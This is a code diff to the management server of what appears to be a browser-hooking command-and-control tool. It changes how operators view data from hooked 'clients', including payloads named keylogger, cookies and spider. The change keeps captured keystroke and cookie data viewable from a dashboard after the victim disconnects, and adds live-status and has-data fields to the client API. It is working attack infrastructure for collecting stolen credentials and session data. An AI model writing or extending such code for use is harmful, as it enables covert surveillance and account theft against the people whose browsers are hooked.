@@ -37,6 +37,10 @@ export function createManagementServer(state, opts = {}) {
     }
   });
 
+  // Payloads backed by the database — historical data is always available regardless of
+  // whether the payload is currently loaded on a live client or enabled in their config.
+  const DB_BACKED_PAYLOADS = new Set(["spider", "keylogger", "cookies"]);
+
   // Viewer WebSocket: dashboards and live-view pages subscribe here.
   // Payload viewer: /view?id=<clientId>&payload=<name>
   // Log viewer:     /view?payload=logs  or  /view?id=<clientId>&payload=logs
@@ -71,34 +75,52 @@ export function createManagementServer(state, opts = {}) {
       return;
     }
 
+    // Validate the client record exists
+    const clientRecord = db.getClient(clientId);
+    if (!clientRecord) {
+      ws.close();
+      return;
+    }
+
+    const isLive = activeClients.has(clientId);
+    const isDbBacked = DB_BACKED_PAYLOADS.has(payloadName);
+    const payloadEnabled = clientRecord.payloads.includes(payloadName);
+
     let handlerState;
 
-    if (activeClients.has(clientId)) {
-      // Client is live — use its active handler state
-      handlerState = activeClients.get(clientId).payloads[payloadName];
-      if (!handlerState) {
-        // Payload is registered but not currently loaded on this client
+    if (isLive) {
+      const activeHandlerState = activeClients.get(clientId).payloads[payloadName];
+      if (activeHandlerState) {
+        // Payload is currently loaded and active on the client
+        handlerState = activeHandlerState;
+      } else if (isDbBacked) {
+        // Payload not loaded but DB-backed — create ephemeral state to show historical data
+        handlerState = handler.initState(db, clientId, storeLog);
+      } else {
+        // Ephemeral payload (domviewer/proxy) not loaded — nothing to show
         ws.close();
         return;
       }
     } else {
-      // Client is offline (or unknown). Check DB — spider results are persisted so viewers
-      // can still browse them after a disconnect. Domviewer shows "No DOM captured yet"
-      // (ephemeral Yjs state is always empty for offline clients).
-      const clientRecord = db.getClient(clientId);
-      if (!clientRecord) {
+      // Offline client: DB-backed payloads always show historical data;
+      // ephemeral payloads only if they were previously enabled.
+      if (isDbBacked || payloadEnabled) {
+        // Create ephemeral handler state for this viewer session only.
+        // It is NOT added to activeClients and is GC'd when the viewer disconnects.
+        handlerState = handler.initState(db, clientId, storeLog);
+      } else {
         ws.close();
         return;
       }
-      // Only allow viewing payloads that the client actually had enabled
-      if (!clientRecord.payloads.includes(payloadName)) {
-        ws.close();
-        return;
-      }
-      // Create ephemeral handler state for this viewer session only.
-      // It is NOT added to activeClients and is GC'd when the viewer disconnects.
-      handlerState = handler.initState(db, clientId, storeLog);
     }
+
+    // Inform the viewer of the client's connection and payload-enabled state upfront.
+    // This lets the UI show correct offline/disabled banners without polling.
+    ws.send(JSON.stringify({
+      type: "client-info",
+      connected: isLive,
+      payloadEnabled,
+    }));
 
     handler.onViewerConnect(handlerState, ws);
   });
@@ -192,17 +214,17 @@ export function createManagementServer(state, opts = {}) {
     res.json(db.getAllLinks());
   });
 
-  /** GET /api/clients — List all clients enriched with live connection status. */
+  /** GET /api/clients — List all clients enriched with live connection status and hasData. */
   app.get("/api/clients", (_req, res) => {
     const clients = db.getAllClients().map((c) => {
       const active = activeClients.get(c.id);
       const activePayloads = active ? Object.keys(active.payloads) : [];
-      return { ...c, connected: activeClients.has(c.id), activePayloads };
+      return { ...c, connected: activeClients.has(c.id), activePayloads, hasData: db.getClientHasData(c.id) };
     });
     res.json(clients);
   });
 
-  /** GET /api/clients/:id — Get a single client with live connection status. */
+  /** GET /api/clients/:id — Get a single client with live connection status and hasData. */
   app.get("/api/clients/:id", requireClient(db), (req, res) => {
     const active = activeClients.get(req.client.id);
     const activePayloads = active ? Object.keys(active.payloads) : [];
@@ -210,6 +232,7 @@ export function createManagementServer(state, opts = {}) {
       ...req.client,
       connected: activeClients.has(req.client.id),
       activePayloads,
+      hasData: db.getClientHasData(req.client.id),
     });
   });
 
